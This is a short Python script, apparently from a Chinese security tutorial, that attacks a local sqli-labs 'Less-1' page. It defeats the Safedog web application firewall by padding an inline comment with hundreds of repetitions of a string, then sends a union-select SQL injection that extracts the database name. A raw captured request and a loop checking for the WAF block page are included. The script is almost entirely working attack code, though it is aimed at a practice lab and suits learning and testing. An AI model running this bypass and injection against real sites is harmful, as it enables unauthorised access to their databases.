# -*- encoding: utf-8 -*-
# Time : 2021/04/14 15:33:48
# Author: crow
# 视频版：https://space.bilibili.com/29903122
# 文字版： https://mp.weixin.qq.com/s/evmgO3kY9khyYyWcZCtcVA
# 相关安装包请移步至公众号获取：乌鸦安全  


import requests


'''
POST http://10.211.55.9/Less-1/ HTTP/1.1
Host: 10.211.55.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: safedog-flow-item=B997255C2337E9B4E56A9ECAB186C267
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

id=-1'	 /**/union select 1,2,3 --+
'''



url = 'http://10.211.55.9/Less-1/'


data = "id=-1'	/**/ union select 1,2,3 --+"

headers = {
    # "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",
    # 'Cookie': 'safedog-flow-item=B997255C2337E9B4E56A9ECAB186C267'
  
    'Host': '10.211.55.9',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'DNT':'1',
    'Connection': 'close',
    # 'Content-Length': '135',
    'Cookie': 'safedog-flow-item=B997255C2337E9B4E56A9ECAB186C267',
    'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '34',
}

# 4位的是从991开始就可以绕过


for  i in range(991, 992):
    m = '/*' +  str('crow') * i   +   '*/'
    # print(m)
    data = "id=-1'"	+ m + "union select 1,2,database() --+"
    res = requests.post(url, headers=headers, data=data).text
    # print(res.text)
    if 'qt-block-indent:0; text-indent' not in res:
        print('[+] current userful payload length:', i)
    else:
        print('{} not userful'.format(i))
    


